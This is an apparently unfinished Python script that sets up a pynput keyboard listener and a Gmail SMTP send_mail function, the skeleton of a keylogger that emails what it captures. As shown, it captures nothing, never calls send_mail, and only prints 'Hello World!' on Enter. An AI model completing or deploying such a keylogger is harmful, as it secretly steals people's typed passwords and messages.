from pynput.keyboard import Key, Controller, Listener
import smtplib 
import email
import os
from dotenv import load_dotenv



load_dotenv();
mouse = Controller();

sender_email = os.getenv("SENDER_EMAIL");
sender_email_password = os.getenv("EMAIL_PASSWORD_GENERATED");
reciver_email = os.getenv("RECIEVER_EMAIL");

#mail server
PORT = 587;



def send_mail(text)->None:
    try:
        server = smtplib.SMTP("smtp.gmail.com",PORT);
        server.starttls();
        server.login(sender_email, sender_email_password);
        server.sendmail(sender_email, reciver_email, text);
        server.quit();
    except Exception as message:
        print("Error sending: {}".format(message));

def key_press(key):
    if key == Key.enter:
        print("Hello World!");
        
def key_release(key):
    if key == Key.enter:
        return False;
    
with Listener(on_press= key_press, on_release=key_release) as listener:
    listener.join();
    
        

    